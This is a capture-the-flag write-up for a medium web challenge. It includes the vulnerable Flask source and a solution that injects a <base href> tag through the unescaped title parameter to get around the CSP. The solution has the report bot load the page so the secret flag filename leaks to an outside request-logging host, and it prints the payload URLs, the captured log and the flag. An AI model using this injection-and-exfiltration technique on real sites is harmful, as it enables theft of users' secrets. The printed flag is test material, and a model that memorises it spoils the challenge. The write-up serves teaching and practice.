# flagfriendly
Web, Medium

## Description

> Flags for friendly Kuchenblech http://45.76.92.221:8070/

```python
#!/usr/bin/env python3
import requests
from flag import flag
from flask import Flask, request, redirect, make_response

app = Flask(__name__)


@app.route("/", methods=["GET"])
def index():
    title = request.args.get("title", default="Flags for Friendly Fellows", type=str)
    print("Flag cookie:", request.cookies.get("flag"))
    if request.cookies.get("flag") == flag:
        # Make sure the filename never leaks!
        path = flag
    else:
        path = "static/flag"
    response = make_response(
        f"""<!doctype html>
<html>
<head>
   <title>{title}</title>
</head>
<body>
    <h1>{title}</h1>
    <img src="/{path}.gif"/>
</body>
</html>"""
    )
    response.headers["Content-Security-Policy"] = "img-src *; default-src 'none';"
    return response


@app.route("/report")
def report():
    """
    This can be used to make bots surf this site.
    Bots will have the flag cookie set accordingly.
    """
    url = request.args.get("url", default="", type=str)
    if not url:
        return "No url parameter provided to surf to"
    return requests.get(f"http://surfer:8075?url={url}").text


@app.route(f"/{flag}.gif")
def show_gif():
    return redirect("/static/flag.gif")


if __name__ == "__main__":
    app.run()

```

## Solution

Visiting the website, we get the following output, as expected:

```html
<!doctype html>
<html>
<head>
   <title>Flags for Friendly Fellows</title>
</head>
<body>
    <h1>Flags for Friendly Fellows</h1>
    <img src="/static/flag.gif"/>
</body>
</html>
```

The `title` field is clearly vulnerable to injection, but scripts won't execute due to the existence of the CSP (Content-Security-Policy) header.

The solution is to inject an HTML tag instead: `<base href="" />`. This tag instructs the browser to load all relative resources from a given base address instead of assuming addresses are relative to the current page's URI.

Let's try visiting `http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://www.google.com%22%20/%3E`:

```html
<!doctype html>
<html>
<head>
   <title><base href="https://www.google.com" /></title>
</head>
<body>
    <h1><base href="https://www.google.com" /></h1>
    <img src="/static/flag.gif"/>
</body>
</html>
```

In this case, the browser attempts to load `/static/flag.gif` from `https://www.google.com` (this obviously fails).

But what if we replace `https://www.google.com` with a server that logs all requests, such as [requestbin.com](https://requestbin.com)? 


```html
<!doctype html>
<html>
<head>
   <title><base href="https://enskhpoprq3jl.x.pipedream.net" /></title>
</head>
<body>
    <h1><base href="https://enskhpoprq3jl.x.pipedream.net" /></h1>
    <img src="/static/flag.gif"/>
</body>
</html>
```

Any access to this page will attempt to load the resource from `https://enskhpoprq3jl.x.pipedream.net`, which will be logged and visible by us. If we visit the page, `/static/flag.gif` will be loaded. But according to the challenge comments, we can trigger a bot to visit any link using the `/report` API, and the bot will have the cookie value which will load the real flag as the image path.

To conclude, we need to access:
```
http://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E
```

The bot visits:
```
http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E
```

The visit gets logged:
```
GET /junior-CSP_THE_C_IS_FOR_CYBER.gif
host: enskhpoprq3jl.x.pipedream.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Pragma: no-cache
Referer: http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
Connection: keep-alive
```

The flag is: `junior-CSP_THE_C_IS_FOR_CYBER`